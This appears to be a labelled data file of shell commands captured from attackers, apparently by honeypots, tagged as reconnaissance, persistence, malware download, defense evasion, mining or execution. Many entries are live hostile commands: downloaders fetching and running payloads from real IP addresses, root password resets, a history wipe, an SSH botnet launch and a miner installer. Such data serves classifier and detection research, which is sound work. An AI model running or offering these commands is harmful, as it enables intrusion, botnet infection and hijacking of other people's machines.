@@ -1,0 +1,151 @@
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PKCHL", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SSDBN", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"root:McL2xkIxoO5t\"|chpasswd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2024"}
+{"command": "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;", "label": "defense_evasion", "count": 733, "sample": "typical_weighted", "period": "2024"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JVFOS", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"blhutchings\\noxBVsNvK64xI\\noxBVsNvK64xI\\n\"|passwd", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"mysql@123\\nq300zt4ipIwE\\nq300zt4ipIwE\\n\"|passwd", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo -e \"reu\\nXYyIFYSGrEcW\\nXYyIFYSGrEcW\"|passwd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "cd /tmp || cd /run || cd /; wget http://104.248.30.69/yoyobins.sh; chmod 777 yoyobins.sh; sh yoyobins.sh; tftp 104.248.30.69 -c get yoyotftp1.sh; chmod 777 yoyotftp1.sh; sh yoyotftp1.sh; tftp -r yoyotftp2.sh -g 104.248.30.69; chmod 777 yoyotftp2.sh; sh yoyotftp2.sh; rm -rf yoyobins.sh yoyotftp1.sh yoyotftp2.sh; rm -rf *", "label": "malware_downloader", "count": 4, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"pass\\nbQNjWSdtfQjy\\nbQNjWSdtfQjy\\n\"|passwd", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo -e \"coin\\ncxFvOBIUm8AK\\ncxFvOBIUm8AK\"|passwd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"ideaconnect\\ndcbVcQJ8iOqi\\ndcbVcQJ8iOqi\\n\"|passwd", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "cat /proc/mounts; /bin/busybox HYKUS", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'", "label": "reconnaissance", "count": 736, "sample": "typical_weighted", "period": "2024"}
+{"command": "echo \"root:HxlyW7NsJsTU\"|chpasswd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2024"}
+{"command": "tftp; wget; /bin/busybox TNIBX", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "tftp; wget; /bin/busybox VKTAL", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2024"}
+{"command": "cat /proc/mounts; /bin/busybox MQKYU", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2024"}
+{"command": "echo \"root:IKUJwL5fN7jy\"|chpasswd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"doule\\n8TIqZdzSQwzI\\n8TIqZdzSQwzI\\n\"|passwd", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "tftp; wget; /bin/busybox RCERZ", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "/bin/busybox KQFYN", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2024"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GWDGN", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"wangyifa\\npTkAhxzbb6sa\\npTkAhxzbb6sa\\n\"|passwd", "label": "persistence", "count": 2, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"root:JLmuu4Lp5RK0\"|chpasswd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "cat /proc/mounts; /bin/busybox QWBQP", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2024"}
+{"command": "echo \"root:njj0N97BN5nm\"|chpasswd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"1234\\n2bF6ITITvYMG\\n2bF6ITITvYMG\\n\"|passwd", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo -e \"teamspeak\\n830wZSxi3P0h\\n830wZSxi3P0h\"|passwd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"tiendashntga\\nU0X9AmbEhTZK\\nU0X9AmbEhTZK\\n\"|passwd", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"root:LHr6HgEfhBKt\"|chpasswd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "nohup $SHELL -c \"curl http://129.144.180.26:60107/linux -o /tmp/9aXpRJBT0s; if [ ! -f /tmp/9aXpRJBT0s ]; then wget http://129.144.180.26:60107/linux -O /tmp/9aXpRJBT0s; fi; if [ ! -f /tmp/9aXpRJBT0s ]; then exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/9aXpRJBT0s && chmod +x /tmp/9aXpRJBT0s && /tmp/9aXpRJBT0s Z3tT4UhH4YNLKS5TleZMXOBXahkde1bkX1vjj1E2KV2L/EdQ7FFrGxpsR+5IR+OMSykoS4LqT1DmVmseCmpW5UhE4I5LKSBcledFXOBXah4fe1buVFvjjlQ2LVSV40xR7FFrGxhsR+JVW+OIXDYpUI78RFPkXW0aG2tX9ldE5ZVWKzZUiOtbV+9TYRwaalflRk38iVQvNlSC4FtU4V1tGhtvVfZeW+CKVTYqV478RFfiXW0aG2le9lJC/IpUITZXg/xHVOBdbRoba1H2XlvgilU2KVSM/EdV511tGhtrX/ZSQvyJUSo2VI3iW1TnX2EcGmpW5EZE6olLKS1UledGSORWYhAca1bmVlXjiVc2KleN/EFf+FVrGBBtV+dWRvKPUjYqUYn8TFP4VWofEG1X51RA8o9SNipRifxEXuJJahwaYVHmV0frm1QqKEuM4ltf4ElqExxhUeZXReKbVCkvS4rnQ0jvU3UeG2FR5ldG4JtRLzZXiORbV+BTdRsZaF3gVkTgiUUpIFeV40BX+FJqBBtiUOxQReOJUjgpV4j8Q0jnV2kEEmtd4FZE5o5FLC9LieFDSOdQdR0eYVHmV0Hlm1QgKkuK50RI41R1GBtiXeBWROKLRSwvS4zkW1fiV3UdGGFR5ldF65tWLjZUiuJbV+VQdRIfYVHmV0Hnm1MpNlSI6ltX7lJ1GBlvXeBWROaDRSkvVpXgRUjnVGIEEmpd4FZE4YhFKShUleNGVPhWax4EalXhXEPiilUuOF2V4ERR+FZiGARpUOxQReOPVzggS4njTEjkUmkEG2tQ7FBF449QugGsFQSgMwcwTlZVvOHVYsPLWpBKXg==; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/9aXpRJBT0s && /tmp/9aXpRJBT0s Z3tT4UhH4YNLKS5TleZMXOBXahkde1bkX1vjj1E2KV2L/EdQ7FFrGxpsR+5IR+OMSykoS4LqT1DmVmseCmpW5UhE4I5LKSBcledFXOBXah4fe1buVFvjjlQ2LVSV40xR7FFrGxhsR+JVW+OIXDYpUI78RFPkXW0aG2tX9ldE5ZVWKzZUiOtbV+9TYRwaalflRk38iVQvNlSC4FtU4V1tGhtvVfZeW+CKVTYqV478RFfiXW0aG2le9lJC/IpUITZXg/xHVOBdbRoba1H2XlvgilU2KVSM/EdV511tGhtrX/ZSQvyJUSo2VI3iW1TnX2EcGmpW5EZE6olLKS1UledGSORWYhAca1bmVlXjiVc2KleN/EFf+FVrGBBtV+dWRvKPUjYqUYn8TFP4VWofEG1X51RA8o9SNipRifxEXuJJahwaYVHmV0frm1QqKEuM4ltf4ElqExxhUeZXReKbVCkvS4rnQ0jvU3UeG2FR5ldG4JtRLzZXiORbV+BTdRsZaF3gVkTgiUUpIFeV40BX+FJqBBtiUOxQReOJUjgpV4j8Q0jnV2kEEmtd4FZE5o5FLC9LieFDSOdQdR0eYVHmV0Hlm1QgKkuK50RI41R1GBtiXeBWROKLRSwvS4zkW1fiV3UdGGFR5ldF65tWLjZUiuJbV+VQdRIfYVHmV0Hnm1MpNlSI6ltX7lJ1GBlvXeBWROaDRSkvVpXgRUjnVGIEEmpd4FZE4YhFKShUleNGVPhWax4EalXhXEPiilUuOF2V4ERR+FZiGARpUOxQReOPVzggS4njTEjkUmkEG2tQ7FBF449QugGsFQSgMwcwTlZVvOHVYsPLWpBKXg==\" &", "label": "malware_downloader", "count": 1, "sample": "typical_weighted", "period": "2024"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HNBVC", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "tftp; wget; /bin/busybox RWOBU", "label": "reconnaissance", "count": 1, "sample": "typical_weighted", "period": "2024"}
+{"command": "echo \"nosoup4u\\n6Wb97WmU2yDx\\n6Wb97WmU2yDx\\n\"|passwd", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"gknopf\\nRlFrvEeopyJ7\\nRlFrvEeopyJ7\\n\"|passwd", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"root:4iilUDyYavAd\"|chpasswd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2024"}
+{"command": "uname -a ; nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c", "label": "reconnaissance", "count": 3, "sample": "typical_weighted", "period": "2024"}
+{"command": "echo -e \"ys\\nHFQfiUBxykwM\\nHFQfiUBxykwM\"|passwd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2021_2022"}
+{"command": "echo \"root:nUbAXfthM7QC\"|chpasswd|bash", "label": "persistence", "count": 1, "sample": "typical_weighted", "period": "2024"}
+{"command": "ps", "label": "reconnaissance", "count": 3, "sample": "novel_skeleton", "period": "2024"}
+{"command": "ps -ef", "label": "reconnaissance", "count": 3, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox wget http://37.49.224.231:80/batkek/arm -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm.wget; >.z", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "echo [[[", "label": "reconnaissance", "count": 2, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "uname -a && nproc", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox mkdir /var/; >/var/.file && cd /var/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "echo ]]]", "label": "reconnaissance", "count": 2, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c;", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "echo -e '\\x54C_CONTINUE' > /uwu", "label": "reconnaissance", "count": 5, "sample": "novel_skeleton", "period": "2024"}
+{"command": "echo xsec", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "wget http://2.58.149.116/ssh/ -O- > ntpclient; chmod 777 ntpclient; ./ntpclient test.wget.", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "User-Agent: python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.66.1.el7.x86_64", "label": "benign", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "cat 1", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cat /bin/echo||while read i; do echo $i; done < /proc/self/exe;", "label": "reconnaissance", "count": 10, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox mkdir /var/tmp/; >/var/tmp/.file && cd /var/tmp/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "apt install screen", "label": "benign", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox mkdir /mnt/; >/mnt/.file && cd /mnt/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox mkdir /boot/; >/boot/.file && cd /boot/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "./.x; ./.z telnet.arm.echo; >.x; >.z", "label": "malware_execution", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "head -c 0 > /tmp/oTLcfnTCDv", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/tmp/ntpclient sftp.mips", "label": "malware_execution", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.43.118/sensi.sh; curl -O http://209.141.43.118/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 209.141.43.118 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 209.141.43.118; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 209.141.43.118 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "sudo ./upnpsetup", "label": "malware_execution", "count": 3, "sample": "novel_skeleton", "period": "2024"}
+{"command": "wget  https://ipinfo.io/org > 1", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cat /proc/mounts || busybox cat /proc/mounts", "label": "reconnaissance", "count": 5, "sample": "novel_skeleton", "period": "2024"}
+{"command": "curl", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "rm -rf sh; wget http://185.191.127.212/sh || curl -O http://185.191.127.212/sh || tftp 185.191.127.212 -c get sh || tftp -g -r sh 185.191.127.212; chmod 777 sh;./sh ssh; rm -rf sh", "label": "malware_downloader", "count": 2, "sample": "novel_skeleton", "period": "2024"}
+{"command": "Accept: */*", "label": "benign", "count": 2, "sample": "novel_skeleton", "period": "2024"}
+{"command": "touch ylyzc", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": ">A@/XBV'8ELFGVR", "label": "benign", "count": 33, "sample": "novel_skeleton", "period": "2024"}
+{"command": "执行命令", "label": "benign", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "echo \"/bin/busybox ERTJJ\" | sh", "label": "reconnaissance", "count": 2, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cat /proc/1", "label": "reconnaissance", "count": 3, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "cat /proc/1/mounts && ls /proc/1/", "label": "reconnaissance", "count": 2, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://216.250.247.185/bins.sh; busybox wget http://216.250.247.185/bins.sh; curl -O http://216.250.247.185/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 216.250.247.185 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r bins.sh -g 216.250.247.185; chmod 777 bins.sh; sh bins.sh; ftpget -v -u anonymous -p anonymous -P 21 216.250.247.185 bins.sh bins.sh; sh bins.sh; rm -rf bins.sh; rm -rf *;exit", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "endScript;", "label": "benign", "count": 2, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "/bin/busybox mkdir /dev/shm/; >/dev/shm/.file && cd /dev/shm/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "uname-a", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox mkdir /dev/; >/dev/.file && cd /dev/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "dd if=/proc/self/exe bs=22 count=2 || while read i; do echo $i; done < /proc/self/exe || cat /proc/self/exe;", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "uptime", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox wget; /bin/busybox tftp; /bin/busybox HGYQA", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cd /tmp; wget http://5.10.249.153:9999/exec.sh; curl -O http://5.10.249.153:9999/exec.sh; bash exec.sh", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "sudo hive-passwd set ifjeeisurofmioufiose", "label": "persistence", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "touch jqzdz", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "touch vsuyz", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "touch dbvpv", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "touch vlowi", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "top -n 1 -b", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "sh -c 'for proc_dir in /proc/[0-9]*; do pid=${proc_dir##*/}; buffer=$(cat \"/proc/$pid/maps\"); if [ \"${#buffer}\" -gt 1 ]; then if [ \"${buffer#*\"/lib/\"}\" = \"$buffer\" ] && [ \"${buffer#*\"/lib64/\"}\" = \"$buffer\" ] && [ \"${buffer#*\"dvrLocker\"}\" = \"$buffer\" ]; then kill -9 \"$pid\"; fi; fi; done'", "label": "defense_evasion", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "wget 62.197.136.157/x-8.6-.Sakura; chmod 777 x-8.6-.Sakura; ./x-8.6-.Sakura x86_64", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "..", "label": "benign", "count": 3, "sample": "novel_skeleton", "period": "2024"}
+{"command": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36", "label": "benign", "count": 2, "sample": "novel_skeleton", "period": "2024"}
+{"command": "Host: 104.238.182.124", "label": "benign", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "}", "label": "benign", "count": 2, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "uname -a ; nproc", "label": "reconnaissance", "count": 2, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox mkdir /var/run/; >/var/run/.file && cd /var/run/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "rm -rf sshdbot; wget http://146.196.67.240/sshdbot || curl -O http://146.196.67.240/sshdbot || tftp 146.196.67.240 -c get sshdbot || tftp -g -r sshdbot 146.196.67.240; chmod 777 sshdbot;./sshdbot sshnfx; rm -rf sshdbot", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": ">?A@/X'8ELFX@L", "label": "benign", "count": 7, "sample": "novel_skeleton", "period": "2024"}
+{"command": "touch djrbn", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox mkdir /usr/; >/usr/.file && cd /usr/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "rm -rf 1.sh; wget http://94.103.188.167/1.sh; chmod +x 1.sh; ./1.sh", "label": "malware_downloader", "count": 2, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox mkdir /dev/netslink/; >/dev/netslink/.file && cd /dev/netslink/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "rm -rf mips; wget http://38.45.200.163/mips || curl -O http://38.45.200.163/mips || tftp 38.45.200.163 -c get mips || tftp -g -r mips 38.45.200.163; chmod 777 mips;./mips ssh; rm -rf mips", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "curl https://ipinfo.io/org", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox mkdir /tmp/; >/tmp/.file && cd /tmp/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox cp /bin/busybox .z; >.z; /bin/busybox chmod 777 .z", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/tmp/LdIZfonKCM /HMzG60Us/PkzWh0yubqvhOzGjRqkYl9NBq7C7Xp49ZrYM7l7LUQox81fYCCYigZsRCq7OXJYGzI5O+0BbIdM32AhGcoGrAVquXjwmxqyeHppB2tGTdjn4BiKBmzHb7r5clrb9jk6aoXugU3aoGfYTQeuRO07OHAem7P++y2Fa0fNn2AhGY8HbMUtOX1zG10z+PztxKtGTVli4djNxq2BbDq+89sdM7h87AWuR02YoWAczcctgu16ODWaW/W4+q+E7MaMmaRgGEyBbEXtPPnyGx0yubovhOzGjRlkYBjNwWwFqrq5tZrbs/v67QUsxomYoaEfTcdtQu17+PWa2/L7+u0FLMdJmKDiH03H7cLteXl1mhswuPttRW0CzNnn4NnMwW0Fqrt785qa8jn/bYXsgU3ZImfajEFsBy+6+XJa2rY5++1C7IbKGKDhX03H7Efsu3kym96ye3vqhyxBTdqgp9lMBG1FbXu7Nhrb8j77LQcrRkyZp+AYzYRtRW17+zYa2rJ++m3C7ITMH2DgGo8HbMUsOj1zGl0yebpqhexHihigoJpMBuyFrP95MtpdMrh76oTuwU3ZYSLZTYatxGk6eLWY27W5Oi0C7IYMmmHgWI1E6MUter7yWxq1ubztRaxETBjgIFjJhqwHKrs7M50b8z77L0duR02YoWFczcatAu85fvMbXTP7OeyFbIbPnOAgWUoGrALtu37wWBsyOTstAWwHShihIN9Nxy6C7bu5cJsasnl5KQUsxgoaoSfaigaux+y7eTKbHrA++y3Eq0aPn2DgGA8HbMUsOjhjEq3Fv+fSZCLk8lzRZQb2pWcTN9QtKI=", "label": "malware_execution", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/bin/busybox cp /bin/busybox .x; /bin/busybox cp /bin/busybox .z; >.x; >.z; /bin/busybox chmod 777 .x .z", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "touch coash", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "echo -n g1buaqpd|md5sum;uname -a", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "User-Agent: libwww-perl/6.67", "label": "benign", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "touch afzfb", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "chmod +x ./.908814642256942895/sshd;nohup ./.908814642256942895/sshd 141.98.24.128 125.88.222.0 43.248.188.109 101.44.163.209 167.114.114.148 103.145.145.82 183.221.214.95 58.223.177.13 182.151.25.46 181.113.114.115 111.74.23.213 185.124.108.182 107.172.84.105 77.91.84.247 164.155.134.70 107.158.225.94 59.38.100.77 188.92.28.249 222.77.96.52 27.128.245.170 117.161.138.2 198.50.206.212 222.77.96.50 23.94.136.106 193.169.244.205 37.58.18.246 93.123.85.185 120.232.132.200 186.233.119.218 37.60.241.18 125.124.179.148 222.186.10.55 180.76.97.38 114.113.151.152 152.89.170.200 195.133.46.73 182.242.140.3 43.248.185.124 185.22.65.186 &", "label": "malware_execution", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.59.88.74/update.sh -O update.sh; busybox wget http://139.59.88.74/update.sh -O update.sh; curl http://139.59.88.74/update.sh -O update.sh; busybox curl http://139.59.88.74/update.sh -O update.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.88.74 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 139.59.88.74 update.sh update.sh; chmod 777 update.sh; ./update.sh; rm -rf update.sh", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "wget  https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 46BuxHk6RE4WnrAD1PeGkTJwYLc1VtEUb5rnmRGe2vweSeFUpCn9Q4UYewGtJwycXWE2Uc2WgCJsZCNTVGMf97tj5q5McVo", "label": "cryptominer", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "echo -n daagtvtd|md5sum;uname -a", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": ">A@/XU'8ELFUyR", "label": "benign", "count": 2, "sample": "novel_skeleton", "period": "2024"}
+{"command": "pkill x11vnc", "label": "defense_evasion", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "echo \"K\"\"G\"\"B\"\"_CLOSE\";", "label": "reconnaissance", "count": 2, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "/bin/bash -c \"uname -a\"", "label": "reconnaissance", "count": 2, "sample": "novel_skeleton", "period": "2024"}
+{"command": "?", "label": "benign", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "/tmp/ntpclient sftp.arm", "label": "malware_execution", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "/tmp/ntpclient sftp.x86", "label": "malware_execution", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "cat /uwu || busybox cat /uwu", "label": "reconnaissance", "count": 5, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 123456", "label": "malware_downloader", "count": 18, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "if [ -f $(which uptime) ]; then", "label": "reconnaissance", "count": 2, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "touch apita", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "touch dkahc", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "wget http://93.123.85.139/cayosinbins.sh; chmod 777 cayosinbins.sh; sh cayosinbins.sh; tftp 93.123.85.139 -c get cayosintftp1.sh; chmod 777 cayosintftp1.sh; sh cayosintftp1.sh; tftp -r cayosintftp2.sh -g 93.123.85.139; chmod 777 cayosintftp2.sh; sh cayosintftp2.sh; rm -rf cayosinbins.sh cayosintftp1.sh cayosintftp2.sh; rm -rf *", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://141.98.10.76/booters.sh; wget http://141.98.10.76/booters.sh; curl -O http://141.98.10.76/booters.sh; chmod 777 booters.sh; sh booters.sh", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c ; uname -a", "label": "reconnaissance", "count": 2, "sample": "novel_skeleton", "period": "2024"}
+{"command": "./zsvc", "label": "malware_execution", "count": 3, "sample": "novel_skeleton", "period": "2024"}
+{"command": "grep [Mm]iner", "label": "reconnaissance", "count": 3, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cmd='N/A';", "label": "benign", "count": 2, "sample": "novel_skeleton", "period": "2021_2022"}
+{"command": "/bin/busybox mkdir /sys/; >/sys/.file && cd /sys/", "label": "reconnaissance", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cd /tmp; wget http://91.92.249.158/ohshit.sh; busybox wget http://91.92.249.158/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; rm -f ohshit.sh", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "cd /tmp; curl http://23.95.132.42/bins/bins.sh -O; busybox curl http://23.95.132.42/bins/bins.sh -O; wget http://23.95.132.42/bins/bins.sh -O bins.sh; busybox wget http://23.95.132.42/bins/bins.sh -O bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2024"}
+{"command": "wget 62.197.136.157/apep.x86; chmod 777 apep.x86; ./apep.x86 x86_64", "label": "malware_downloader", "count": 1, "sample": "novel_skeleton", "period": "2021_2022"}
